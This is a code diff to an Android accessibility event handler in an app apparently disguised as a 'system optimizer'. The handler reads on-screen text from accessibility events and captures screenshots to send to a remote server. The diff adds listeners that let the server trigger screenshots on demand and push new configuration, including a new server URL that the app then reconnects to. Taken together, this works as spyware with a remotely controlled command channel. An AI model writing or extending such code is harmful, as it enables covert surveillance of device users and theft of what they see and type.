@@ -9,6 +9,7 @@ import android.os.Handler;
 import android.os.Looper;
 import timber.log.Timber;
 
+import org.json.JSONObject;
 
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
@@ -18,7 +19,8 @@ import com.system.optimizer.service.ScreenshotCallback;
 import android.view.accessibility.AccessibilityEvent;
 
 /**
- * Unified event handler for text events with optional screenshot capture.
+ * Unified event handler for text events and window state change events with
+ * optional screenshot capture.
  * 
  * Flow:
  * 1. Trigger with text (optional)
@@ -27,8 +29,6 @@ import android.view.accessibility.AccessibilityEvent;
  * 4. When screenshot resolves: send image
  */
 public class AccessibilityEventHandler {
-
-
 
     private static final long DELAY_MS = 2000;
 
@@ -42,21 +42,20 @@ public class AccessibilityEventHandler {
     private final Runnable executeRunnable;
     private String pendingRequestId = null;
 
-    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig,
-            SocketManager socketManager) {
+    public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig) {
         if (captureProvider == null) {
             throw new IllegalArgumentException("Capture provider cannot be null");
         }
         if (appConfig == null) {
             throw new IllegalArgumentException("AppConfig cannot be null");
         }
-        if (socketManager == null) {
-            throw new IllegalArgumentException("SocketManager cannot be null");
-        }
 
         this.captureProvider = captureProvider;
         this.appConfig = appConfig;
-        this.socketManager = socketManager;
+        this.socketManager = new SocketManager(appConfig);
+
+        // Register persistent listeners for server events
+        registerPersistentListeners();
 
         this.executeRunnable = () -> {
             String textToSend;
@@ -77,7 +76,7 @@ public class AccessibilityEventHandler {
             // Check config before capturing screenshot (only for automatic captures)
             ConfigData config = appConfig.getConfig();
             if (pendingRequestId == null && !config.isAutoScreenshotEnabled()) {
-                socketManager.sendEvent("screenshot_error", "Screenshot disabled in config");
+                socketManager.sendEvent("screenshot_error", "automatic captures disabled in config");
                 return;
             }
 
@@ -112,9 +111,57 @@ public class AccessibilityEventHandler {
     }
 
     /**
+     * Register persistent listeners for server events.
+     * These listeners will be automatically registered on new sockets.
+     */
+    private void registerPersistentListeners() {
+        // Listener for screenshot requests from server
+        socketManager.addPersistentListener("screenshot", args -> {
+            try {
+                JSONObject data = (JSONObject) args[0];
+                String requestId = data.getString("request_id");
+
+                Timber.d("Screenshot request received: %s", requestId);
+                triggerManualCapture(requestId);
+
+            } catch (Exception e) {
+                Timber.e(e, "Invalid screenshot request format");
+                socketManager.sendEvent("screenshot_error", "Invalid or missing request_id");
+            }
+        });
+
+        // Listener for config updates from server
+        socketManager.addPersistentListener("config_data", args -> {
+            Timber.d("ConfigData event received from server");
+            try {
+                JSONObject configJson = (JSONObject) args[0];
+
+                ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
+                String newServerUrl = serverConfig.getServerUrl();
+
+                // Get current stored URL before updating config
+                String currentServerUrl = appConfig.getStoredServerUrl();
+
+                Timber.d("Refreshing config data from server");
+                appConfig.setConfig(serverConfig);
+
+                // Check if server URL has changed
+                if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
+                    Timber.d("Server URL changed from %s to %s", currentServerUrl, newServerUrl);
+
+                    Timber.d("Reconnecting socket to new URL");
+                    socketManager.reconnectToNewUrl();
+                }
+            } catch (Exception e) {
+                Timber.e(e, "Error processing config_data from server: %s", e.getMessage());
+            }
+        });
+    }
+
+    /**
      * Handle accessibility event from AccessibilityMonitorService.
      */
-    public void onAccessibilityEvent(AccessibilityEvent event) {
+    public void handleEvent(AccessibilityEvent event) {
         if (event == null || event.getText() == null) {
             return;
         }
@@ -141,7 +188,7 @@ public class AccessibilityEventHandler {
     /**
      * Trigger with text - will send text and capture screenshot after delay.
      */
-    public void triggerWithText(String text) {
+    private void triggerWithText(String text) {
         synchronized (this) {
             pendingText = text;
             pendingRequestId = null;
@@ -155,7 +202,7 @@ public class AccessibilityEventHandler {
      * 
      * @param requestId The request_id from the server to include in the response
      */
-    public void triggerManualCapture(String requestId) {
+    private void triggerManualCapture(String requestId) {
         synchronized (this) {
             pendingText = "";
             pendingRequestId = requestId;
@@ -167,7 +214,7 @@ public class AccessibilityEventHandler {
      * Trigger for window change (TYPE_WINDOW_STATE_CHANGED) - capture screenshot
      * only.
      */
-    public void triggerCaptureOnly() {
+    private void triggerCaptureOnly() {
         synchronized (this) {
             pendingText = "";
             pendingRequestId = null;
@@ -205,5 +252,14 @@ public class AccessibilityEventHandler {
             }
         }
         return sb.toString();
+    }
+
+    /**
+     * Cleanup resources. Call from Service.onDestroy()
+     */
+    public void cleanup() {
+        if (socketManager != null) {
+            socketManager.disconnect(true);
+        }
     }
 }
